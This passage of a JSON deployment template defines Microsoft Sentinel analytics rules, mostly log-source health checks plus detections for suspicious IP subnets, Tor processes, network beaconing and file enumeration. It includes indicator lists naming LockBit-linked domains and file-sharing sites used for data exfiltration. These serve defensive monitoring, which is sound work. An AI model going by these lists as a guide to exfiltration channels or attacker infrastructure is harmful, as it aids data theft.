        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9090')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9090: [Health] Heartbeat - Silent - A computer has not been seen",
          "description": "This rule alerts when computers that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in the last 1 to 4 days (configurable, default is 3 days).\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9090_CONFIGURATION MITRE:  Category: Windows/Linux Machines tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 1d; \nlet end_time = now();\nlet suppression_time=3d;\nlet start_time_historical = 14d;\nlet alert_bin = 1d;\nlet description = (table_parameter: (*)){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = parse_json(all_data[k])\n        | extend ExtendedDescription = iff(k startswith 'bv_', strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n            , isnotempty(array_sort_desc(pack_array(all_data[k]))[0]), strcat(k,': ', all_data[k])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet RecentAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(suppression_time) .. now())\n| where AlertName startswith 'BV-9070' or AlertName startswith 'BV-9090'\n| extend Computer = todynamic(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).Computer))[0]))\n| summarize make_set_if(Computer, isnotempty(Computer))\n);\nHeartbeat\n| where TimeGenerated between (ago(start_time_historical)..end_time)\n| where Computer !in (RecentAlerts)\n| make-series EventCount=count() on TimeGenerated from ago(start_time_historical) to now() step alert_bin by Computer\n| extend (anomalies, score, baseline) = series_decompose_anomalies(EventCount)\n| mv-apply e=EventCount on (\n    summarize TotalDaysMissing=countif(e==0)\n)\n//Computers must have reported events for 10 out of the last 14 days\n| where TotalDaysMissing < 4\n//Start Calculate days missing\n| extend EventCountString = strcat_array(EventCount, ',')\n| extend DaysMissingString = extract(@'[1-9]*,([,0]+)$',1,EventCountString)\n| extend DaysMissingString = replace_string(DaysMissingString, ',', '')\n| extend DaysMissing = string_size(DaysMissingString)\n| where DaysMissing != 0\n| mv-apply m=A9090_CONFIGURATION['MonitoredHosts'] on (\n    extend m_list = split(m['host'],',')\n    | mv-apply ml = m_list on (\n        extend threshold = iff(Computer contains ml, toint(m['threshold']), -1)\n        | summarize bv_alarm_threshold = max(threshold)\n    )\n)\n|extend Computer = tolower(Computer)\n| where Computer matches regex A9090_EXCLUDED_COMPUTER == false\n| extend bv_alarm_threshold = coalesce(bv_alarm_threshold,-1)\n| where bv_alarm_threshold != -1\n| extend bv_src_dvc = Computer\n| extend bv_alarm_value = DaysMissing\n| extend bv_alarm_time = now()\n| invoke description()\n| extend bv_raw = pack_all()\n| where bv_alarm_value >= bv_alarm_threshold\n|extend bv_start_time = now()\n  , bv_mss_category = 'LogSource Disruption'\n  , bv_alarm_type = 'Silent Provider'\n  , bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9090'\n  , bv_alarm_severity = 'low'\n  , sourcetype = 'Heartbeat'\n  , bv_severity = 'low'\n  , bv_reporting_dvc = bv_src_dvc\n| extend bv_rule_version = '1.1.5269'\n| extend bv_rule_timestamp = '1715629082.4672413'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5269 bv_rule_timestamp: 1715629082.4672413'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9090: [Health] Heartbeat - {{bv_src_dvc}} has been missing for {{bv_alarm_value}} day(s)",
            "alertDescriptionFormat": "This rule alerts when computers that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in the last 1 to 4 days (configurable, default is 3 days).\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9090_CONFIGURATION\n\n{{ExtendedDescription}}\n\nCategory: Heartbeat\ntag: Health\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "Computer": "bv_src_dvc"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9010')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9010')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9010: [Health] - BV Collector - Silent 1 hour",
          "description": "This alert identifies when a BV log collector has not sent a heartbeat message in at least 1 hour. MITRE:  Category: Health tag: Health",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 0h;     \nlet start_time = 3h;\nlet end_time = now();\nlet suppression_time=2h;\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(1d) .. now())\n  | where AlertName startswith 'BV-9010:'\n  |parse DisplayName with * 'hour ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  );  \nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb'\n| where HostName !in (RecentAlerts)\n| summarize max(TimeGenerated) by HostName\n| extend TimeSinceLastHeartbeat = (now() - max_TimeGenerated)\n| extend SecondsMissing = round(TimeSinceLastHeartbeat / 1s, 0)\n| where SecondsMissing > 3600\n|extend ExtendedDescription = strcat('BV collector ', HostName, ' has not reported in ', SecondsMissing, ' seconds, which is over the default 3600 second (1 hour) threshold')\n| extend Tags = 'tag: Health'\n|summarize arg_max(max_TimeGenerated, *) by HostName\n| extend bv_rule_version = '1.1.4238'\n| extend bv_rule_timestamp = '1696972984.7916214'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.4238 bv_rule_timestamp: 1696972984.7916214'\n| project-keep HostName, max_TimeGenerated, SecondsMissing, ExtendedDescription, Tags, bv_*\n| extend bv_start_time = max_TimeGenerated\n        , bv_src_dvc = HostName \n        , sourcetype= 'syslog'\n        , bv_mss_category = 'Collector Disruption'\n        , bv_alarm_type = 'Heartbeat'\n        , bv_alarm_subtype = 'Heartbeat - bvhb'\n        , bv_alarm_name = 'BV-9010'\n        , bv_alarm_threshold = '3600'\n        , bv_alarm_value = SecondsMissing\n        , bv_severity = 'high'\n|project-keep bv_*, HostName\n, sourcetype\n, max_TimeGenerated, SecondsMissing, ExtendedDescription, Tags",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9010: [Health] - BV Collector - Silent 1 hour {{HostName}}",
            "alertDescriptionFormat": "This alert identifies a BV log collector that has been offline for at least 1 hour. {{ExtendedDescription}} Category: Sentinel Usage {{Tags}}\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9092')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9092')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9092: [Health] BlueVoyant - Analytics Rule Disabled",
          "description": "This alert identifies and creates a list of BlueVoyant rules which have been auto-disabled. MITRE:  Category: Health tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time_historical = 7d; \nlet empty_deployed_alerts = datatable(bv_rule_id:dynamic)[];\nlet PreviousAlerts = toscalar(SecurityAlert\n|where TimeGenerated between (ago(start_time_historical) .. now())\n|where AlertName has 'BV-9092' \n| extend custom_details =todynamic(tostring(todynamic(ExtendedProperties)['Custom Details']))\n| extend\n    rule_id = todynamic(tostring(todynamic(tostring(custom_details.bv_rule_id))[0]))\n| summarize make_set_if(rule_id, isnotempty(rule_id)));        \nlet AutoDisabled = toscalar(\nunion isfuzzy=true\nempty_deployed_alerts,\n(SentinelDeployedAlerts_CL \n| where TimeGenerated >= ago(start_time_historical)\n| where DisplayName_s has 'BV-'\n| where DisplayName_s has_any ('[SOC]', '[RBA]')\n| project TimeGenerated, DisplayName_s, IsEnabled_b\n| summarize arg_max(TimeGenerated,*), DisabledSince = minif(TimeGenerated, IsEnabled_b == false), EnabledSince = maxif(TimeGenerated, IsEnabled_b) by DisplayName_s\n| where IsEnabled_b == false and DisplayName_s has 'AUTO DISABLED'\n| parse DisplayName_s with RuleId ':' *\n| extend RuleId = replace_string(RuleId, 'AUTO DISABLED ', '')\n| summarize bv_rule_id = make_set(RuleId))\n);\nlet AlertHealthDetails = materialize(\nSentinelHealth\n| where TimeGenerated >= ago(start_time_historical)\n| where SentinelResourceName has 'BV-'\n| where SentinelResourceName has_any ('[SOC]', '[RBA]')\n| project TimeGenerated, Description, SentinelResourceName\n| parse SentinelResourceName with bv_rule_id ':' *\n);\nlet Disabled = AlertHealthDetails\n| where TimeGenerated < ago(12h)\n| where Description has 'Rule failed to run on multiple occasions and has been disabled'\n| summarize DisabledSince = max(TimeGenerated) by bv_rule_id, SentinelResourceName;\nAlertHealthDetails      \n| where TimeGenerated >= ago(1h)\n| where Description has 'Rule executed successfully'\n| join kind=rightanti Disabled on bv_rule_id\n| where bv_rule_id !in~ (PreviousAlerts)\n| extend ExtendedDescription = strcat(SentinelResourceName, ' has been auto-disabled since ', DisabledSince)\n| extend bv_rule_version = '1.0.5388' \n  , bv_rule = SentinelResourceName\n  , bv_alarm_name = 'BV-9092' \n  , sourcetype = bv_rule_id\n  , bv_severity = 'informational'\n| extend bv_rule_timestamp = '1719865245.909891'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5388 bv_rule_timestamp: 1719865245.909891'\n|project-keep bv* , DisabledSince, ExtendedDescription, sourcetype",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9092: [Health] BlueVoyant - {{bv_rule_id}} Has Been Auto-Disabled",
            "alertDescriptionFormat": "This alert identifies and creates a list of BlueVoyant rules which have been auto-disabled by Microsoft.  This is often an automatic response action.  This alert will be investigated by BlueVoyant for tuning and optimization purposes and does not require your input at this time.  Should we need any information, BlueVoyant will reach out to you.\n\n{{ExtendedDescription}}\n\nCategory: SentinelHealth\ntag: Health\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_rule_id": "bv_rule_id"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ae42d4a2-d87b-4788-910f-0003451e8980')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ae42d4a2-d87b-4788-910f-0003451e8980')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AISO IOCs Monitor Suspicious Remote IP Connections",
          "description": "This rule triggers on any outbound connection to IP subnets 162.208.16.0/24, 185.206.25.0/24, or 66.203.125.0/24 observed in DeviceNetworkEvents. These IP ranges may indicate suspicious or malicious activity.",
          "severity": "Medium",
          "enabled": true,
          "query": "DeviceNetworkEvents\n| where RemoteIP startswith \"162.208.16.\" // Match any IP in 162.208.16.0/24\n    or RemoteIP startswith \"185.206.25.\" // Match any IP in 185.206.25.0/24\n    or RemoteIP startswith \"66.203.125.\" // Match any IP in 66.203.125.0/24\n| project TimeGenerated, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessFolderPath, LocalIP\n\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "Exfiltration"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/89d6ec98-8df1-475c-b009-50f42b01dcf6')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/89d6ec98-8df1-475c-b009-50f42b01dcf6')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AISO IOCs - TLP-AMBER+STRICT - threat indicators from a reliable source.",
          "description": "This rule identifies suspicious DNS queries associated with potential malicious activity. It monitors for domains linked to LockBit ransomware operations, queries starting with 'lockbit', and any domains ending in '.onion', which are commonly used for dark web communication or command and control channels",
          "severity": "Medium",
          "enabled": true,
          "query": "       let domains = datatable(DnsQuery: string)\n[\n    \"anonfiles.com\",\n    \"dispossessor.com\",\n    \"dispossessor-cloud.com\",\n    \"fex.net\",\n    \"lockbitapt.uz\",\n    \"lockbitsupp.uz\",\n    \"mega.nz\",\n    \"premiumize.com\",\n    \"sendspace.com\",\n    \"transfer.sh\",\n    \"send.exploit.in\",\n    \"cyberfear.com\"\n];\nASimDnsActivityLogs\n| where DnsQuery in (domains) or DnsQuery matches regex @\"^lockbitsup.*\" or DnsQuery endswith \".onion\" // Match domains, lockbitsup.*, or .onion\n| project TimeGenerated, DnsQuery, SrcIpAddr, SrcPortNumber, DstIpAddr, DnsResponseName, NetworkProtocol\n     \n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "Exfiltration"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/906bc9b0-f001-4b7d-ba09-22f76a81e759')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/906bc9b0-f001-4b7d-ba09-22f76a81e759')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TOR Browser Executable",
          "description": "Look for processes related to the Tor Browser executable",
          "severity": "High",
          "enabled": true,
          "query": "DeviceProcessEvents\n| where FileName in (\"tor.exe\", \"torbrowser.exe\") // Adjust for your environment\n| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessAccountName, DeviceName",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Collection",
            "Exfiltration"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/75d38960-e9fe-4fe1-95ab-b24a3d4ac861')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/75d38960-e9fe-4fe1-95ab-b24a3d4ac861')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential beaconing activity (ASIM Network Session schema)",
          "description": "This rule identifies beaconing patterns from Network traffic logs based on recurrent frequency patterns. \nSuch potential outbound beaconing patterns to untrusted public networks should be investigated for any malware callbacks or data exfiltration attempts as discussed in this [Blog](https://medium.com/@HuntOperator/detect-beaconing-with-flare-elastic-stack-and-intrusion-detection-systems-110dc74e0c56).\nThis analytic rule uses [ASIM](https://aka.ms/AboutASIM) and supports any built-in or custom source that supports the ASIM NetworkSession schema'",
          "severity": "Low",
          "enabled": false,
          "query": "let querystarttime = 2d;\nlet queryendtime = 1d;\nlet TimeDeltaThreshold = 10;\nlet TotalEventsThreshold = 15;\nlet PercentBeaconThreshold = 80;\nlet LocalNetworks=dynamic([\"169.254.0.0/16\",\"127.0.0.0/8\"]);\n_Im_NetworkSession(starttime=ago(querystarttime), endtime=ago(queryendtime))\n| where not(ipv4_is_private(DstIpAddr))\n| where not (ipv4_is_in_any_range(DstIpAddr, LocalNetworks))\n| project \n    TimeGenerated\n    , SrcIpAddr\n    , SrcPortNumber\n    , DstIpAddr\n    , DstPortNumber\n    , DstBytes\n    , SrcBytes\n| sort by \n    SrcIpAddr asc\n    , TimeGenerated asc\n    , DstIpAddr asc\n    , DstPortNumber asc\n| serialize\n| extend \n    nextTimeGenerated = next(TimeGenerated, 1)\n    , nextSrcIpAddr = next(SrcIpAddr, 1)\n| extend \n    TimeDeltainSeconds = datetime_diff('second', nextTimeGenerated, TimeGenerated)\n| where SrcIpAddr == nextSrcIpAddr\n//Whitelisting criteria/ threshold criteria\n| where TimeDeltainSeconds > TimeDeltaThreshold \n| project\n    TimeGenerated\n    , TimeDeltainSeconds\n    , SrcIpAddr\n    , SrcPortNumber\n    , DstIpAddr\n    , DstPortNumber\n    , DstBytes\n    , SrcBytes\n| summarize\n    count()\n    , sum(DstBytes)\n    , sum(SrcBytes)\n    , make_list(TimeDeltainSeconds) \n    by TimeDeltainSeconds\n        , bin(TimeGenerated, 1h)\n        , SrcIpAddr\n        , DstIpAddr\n        , DstPortNumber\n| summarize\n    (MostFrequentTimeDeltaCount, MostFrequentTimeDeltainSeconds) = arg_max(count_, TimeDeltainSeconds)\n    , TotalEvents=sum(count_)\n    , TotalSrcBytes = sum(sum_SrcBytes)\n    , TotalDstBytes = sum(sum_DstBytes)\n    by bin(TimeGenerated, 1h)\n        , SrcIpAddr\n        , DstIpAddr\n        , DstPortNumber\n| where TotalEvents > TotalEventsThreshold \n| extend BeaconPercent = MostFrequentTimeDeltaCount/toreal(TotalEvents) * 100\n| where BeaconPercent > PercentBeaconThreshold\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071",
            "T1571"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "fcb9d75c-c3c1-4910-8697-f136bfef2363",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Potential beaconing from {{SrcIpAddr}} to {{DstIpAddr}}",
            "alertDescriptionFormat": "Potential beaconing pattern from a client at address {{SrcIpAddr}} to a server at address {{DstIpAddr}} over port {{DstPortNumber}} identified. Such potential outbound beaconing pattern to untrusted public networks should be investigated for any malware callbacks or data exfiltration attempts as discussed in this [Blog](http://www.austintaylor.io/detect/beaconing/intrusion/detection/system/command/control/flare/elastic/stack/2017/06/10/detect-beaconing-with-flare-elasticsearch-and-intrusion-detection-systems/). The recurring frequency, reported as FrequencyTime in the custom details, and the total transferred volume reported as TotalDstBytes in the custom details, can help to determine the significance of this incident."
          },
          "customDetails": {
            "TotalDstBytes": "TotalDstBytes",
            "FrequencyTime": "MostFrequentTimeDeltaCount",
            "DstPortNumber": "DstPortNumber",
            "FrequencyCount": "TotalSrcBytes"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DstIpAddr"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10519')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10519')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10519: [Custom] Windows - Large Number of Silent Log Sources",
          "description": "Generates an event when the number of missing devices meets or exceeds the threshold. MITRE: undefined Category: Windows Security Events tag: Custom",
          "severity": "Low",
          "enabled": true,
          "query": "let latency = 1h;\nlet start_time = 1d;\nlet end_time = now();\nlet alert_bin = 1h;\nlet start_time_historical = 2d;\nlet HistoryComputers = SecurityEvent\n| where TimeGenerated between (ago(start_time_historical) .. ago(start_time))\n| extend bv_src_dvc_hostname = Computer\n| summarize bv_event_count=count(), bv_end_time=max(TimeGenerated) by bv_src_dvc_hostname;\nlet TodayComputers = SecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| extend bv_src_dvc_hostname = Computer\n| project bv_src_dvc_hostname;\nlet MissingComputers = HistoryComputers\n| join kind=leftanti TodayComputers on bv_src_dvc_hostname;\nlet NumberMissing = toscalar(MissingComputers | summarize count());\nMissingComputers\n| where NumberMissing >= BV10519_THRESHOLD\n| project \n  bv_src_dvc_hostname\n  , bv_event_count\n  , bv_end_time",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc_hostname"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8c41d8e8-c84b-481f-9cc8-39fe647848ec')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8c41d8e8-c84b-481f-9cc8-39fe647848ec')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TEST RULE: Detect potential file enumeration activity (ASIM Web Session)",
          "description": "Refined to only trigger on Med and High Severity Alerts.  This rule will replace current \"Detect potential file enumeration activity (ASIM Web Session)\" rule after testing. This detection method identifies potential cases of file enumeration activity. The query is designed to identify client sources that generate multiple requests resulting in 404 error codes",
          "severity": "Medium",
          "enabled": true,
          "query": "// HTTP response status codes indicate whether a specific HTTP request has been successfully completed.\n// Please refer this for more details: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status\nlet HTTPErrorCode=dynamic([\"404\"]);\nlet threshold = 10; // You can update this threshold to the value that suites your environment\n// let FileNotFoundRequests = \n_Im_WebSession (starttime=ago(1h))\n| where EventSeverity !in (\"Informational\", \"Low\")// exluding Information and Low incidents added by AMayor 12/16/24\n| where EventResultDetails in~ (HTTPErrorCode)\n// Filter the logs to include only HTTP GET requests with an HTTP status code of 404 and '/' in the URL\n| where HttpRequestMethod =~ \"GET\" and Url contains \"/\"\n| summarize\n    RequestCount = count(),\n    FileCount=dcount(Url),\n    EventStartTime=min(TimeGenerated),\n    EventEndTime=max(TimeGenerated),\n    RequestURLs = make_set(Url, 100),\n    DestinationIPList=make_set(DstIpAddr, 100)\n    by SrcIpAddr, SrcUsername, SrcHostname, DstHostname, EventSeverity\n| where RequestCount > threshold  // Adjust the threshold as per your requirements\n| extend\n    Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 0)[0]), SrcUsername),\n    UPNSuffix = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 1)[0]), \"\")\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Discovery",
            "CommandAndControl"
          ],
          "techniques": [
            "T1110",
            "T1083",
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5f7c2bf6-22cc-4664-bcc9-a6433a0baa43')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5f7c2bf6-22cc-4664-bcc9-a6433a0baa43')]",
